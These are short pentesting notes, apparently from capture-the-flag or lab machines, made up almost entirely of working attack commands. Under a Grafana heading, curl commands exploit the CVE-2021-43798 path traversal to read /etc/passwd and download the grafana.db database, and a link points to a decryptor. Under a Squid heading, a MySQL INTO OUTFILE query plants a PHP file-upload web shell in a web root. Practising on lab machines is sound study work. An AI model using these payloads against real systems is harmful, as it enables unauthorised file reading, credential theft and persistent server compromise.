
#### Fanastic => Grafana 
```
curl http://{{URL}}/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
curl http://{{URL}}/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flib%2Fgrafana%2Fgrafana.db --output grafana.db
https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798
```

#### Squid => squid proxy, but mysql rev shell 
` SELECT "<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>" INTO OUTFILE 'C:/wamp/www/uploader.php'; ` 

Also check for /webdav , /zm , /login 
Use curl -v to check header & version. 
